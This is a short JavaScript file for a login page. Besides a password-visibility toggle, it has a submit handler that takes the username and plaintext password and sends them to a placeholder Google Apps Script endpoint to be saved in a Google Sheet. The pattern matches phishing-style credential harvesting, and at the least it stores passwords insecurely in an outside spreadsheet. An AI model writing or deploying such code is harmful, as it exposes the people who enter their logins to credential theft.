function togglePassword(){

let password = document.getElementById("password")

if(password.type === "password"){

password.type = "text"

}else{

password.type = "password"

}

}


/* SEND DATA TO GOOGLE SHEETS */

document.getElementById("loginForm")
.addEventListener("submit",function(e){

e.preventDefault()

let username = document.getElementById("username").value
let password = document.getElementById("password").value


fetch("YOUR_GOOGLE_SCRIPT_URL",{

method:"POST",

body:JSON.stringify({

username:username,
password:password

})

})

.then(res=>res.text())
.then(data=>{

alert("Data saved")

})

})